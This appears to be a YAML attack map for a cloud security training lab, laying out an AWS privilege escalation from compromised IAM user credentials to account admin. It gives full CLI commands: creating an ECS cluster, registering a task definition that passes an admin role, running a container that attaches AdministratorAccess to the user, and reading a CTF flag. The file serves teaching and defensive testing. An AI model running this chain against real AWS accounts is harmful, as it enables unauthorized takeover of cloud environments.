attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ecs:CreateCluster, ecs:RegisterTaskDefinition, ecs:RunTask,
        and iam:PassRole permissions that allow passing the privileged target role to
        an attacker-controlled ECS task.

    - id: ecs-cluster
      label: "New ECS Cluster"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-002-attack-cluster"
      description: >
        An ECS cluster created by the attacker to host the malicious task. Creating
        a cluster requires only ecs:CreateCluster and provides the execution environment
        for the privilege escalation container.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role"
      description: >
        A privileged IAM role with administrative permissions that is configured to
        be assumable by ECS tasks. The starting user has iam:PassRole permission on
        this role, allowing it to be attached as the task role when registering a
        task definition. When the ECS Fargate task executes using this role, the
        container runs iam:AttachUserPolicy to attach the AdministratorAccess managed
        policy to the starting user, granting permanent administrative access to the
        AWS account using the attacker's original credentials — admin-equivalent
        permissions that are then used to read the scenario's CTF flag from SSM
        Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ecs-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: ecs-cluster
      label: "ecs:CreateCluster"
      description: >
        The attacker creates a new ECS cluster to serve as the execution environment
        for the malicious task.
      hints:
        - "Create a new ECS cluster with ecs:CreateCluster to serve as the execution environment. You will need a VPC subnet for Fargate's awsvpc network mode when you run the task."
        - "Run the task with ecs:RunTask using launch-type FARGATE and awsvpc network configuration. Monitor with ecs:DescribeTasks until STOPPED, then wait 15 seconds for IAM propagation before verifying the policy attachment."
      commands:
        - description: "Create a new ECS cluster"
          command: "aws ecs create-cluster --cluster-name pl-prod-ecs-002-attack-cluster"

    - from: starting-user
      to: target-role
      label: "iam:PassRole + ecs:RegisterTaskDefinition"
      description: >
        The attacker registers a task definition that specifies the privileged target
        role as the task role. The iam:PassRole permission authorizes attaching this
        role to the task definition.
      hints:
        - "Register a task definition with ecs:RegisterTaskDefinition, setting taskRoleArn to the target role via iam:PassRole. Use the amazon/aws-cli image and set the container command to call iam:AttachUserPolicy to attach AdministratorAccess to your starting user."
        - "Browse to https://pathfinding.cloud/paths/ecs-002 for technique details."
      commands:
        - description: "Register a malicious task definition with the privileged role"
          command: "aws ecs register-task-definition --family pl-ecs-002-privesc --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role --network-mode awsvpc --requires-compatibilities FARGATE --cpu 256 --memory 512 --container-definitions '[{\"name\":\"escalate\",\"image\":\"amazon/aws-cli\",\"essential\":true,\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-002-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"],\"logConfiguration\":{\"logDriver\":\"awslogs\",\"options\":{\"awslogs-create-group\":\"true\",\"awslogs-group\":\"/ecs/pl-ecs-002-privesc\",\"awslogs-region\":\"us-east-1\",\"awslogs-stream-prefix\":\"ecs\"}}}]'"

    - from: ecs-cluster
      to: target-role
      label: "ecs:RunTask"
      description: >
        The attacker runs the malicious task on Fargate using the attacker-created
        cluster and the registered task definition. The task executes with the
        privileged target role attached, running the container command that grants
        the starting user administrative access.
      hints: []
      commands:
        - description: "Run the malicious task on Fargate"
          command: "aws ecs run-task --cluster pl-prod-ecs-002-attack-cluster --task-definition pl-ecs-002-privesc --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}'"
        - description: "Monitor task status until it reaches STOPPED"
          command: "aws ecs describe-tasks --cluster pl-prod-ecs-002-attack-cluster --tasks TASK_ARN --query 'tasks[0].lastStatus' --output text"
        - description: "Verify admin policy was attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-002-to-admin-starting-user"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access gained in the previous step.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ecs-002-to-admin --query 'Parameter.Value' --output text"
